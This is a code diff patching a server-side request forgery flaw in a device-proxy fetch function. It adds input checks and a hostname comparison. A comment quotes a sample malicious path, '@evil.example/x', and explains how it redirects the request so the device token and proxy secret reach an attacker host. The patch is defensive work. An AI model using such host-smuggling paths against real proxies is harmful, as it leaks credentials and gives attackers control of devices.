@@ -33,7 +33,22 @@ export function build101Response(resp: any) {
 import { fetchWithTimeout } from "./reliability.ts";
 
 export async function deviceFetch(env: any, device: any, restPath: string, init: any = {}) {
-  const upstream = new URL(`https://${device.hostname}${restPath}`);
+  // round-120: SSRF via '@' userinfo — `new URL("https://${hostname}${restPath}")`
+  // with restPath = "@evil.example/x" parsed device.hostname as USERINFO and
+  // set host = evil.example, then fetched it with the device token + proxy
+  // secret attached (the attacker captures both → permanent token = device
+  // RCE surviving revoke/TTL). Build the upstream from the hostname field
+  // ONLY and reject any restPath that could smuggle a host (userinfo '@',
+  // scheme, or a path that re-roots the URL).
+  if (restPath.includes("@") || /^[a-z][a-z0-9+.-]*:/i.test(restPath)) {
+    return { status: 400, ok: false, resp: undefined, error: "invalid proxy path" };
+  }
+  const upstream = new URL(`https://${device.hostname}${restPath.startsWith("/") ? restPath : "/" + restPath}`);
+  // Belt-and-suspenders: whatever the parser produced, the host MUST be the
+  // device's own hostname (never attacker-controlled).
+  if (upstream.hostname !== device.hostname) {
+    return { status: 400, ok: false, resp: undefined, error: "invalid proxy path" };
+  }
   const headers = new Headers(init.headers || {});
   headers.delete("host");
   headers.delete("cookie");
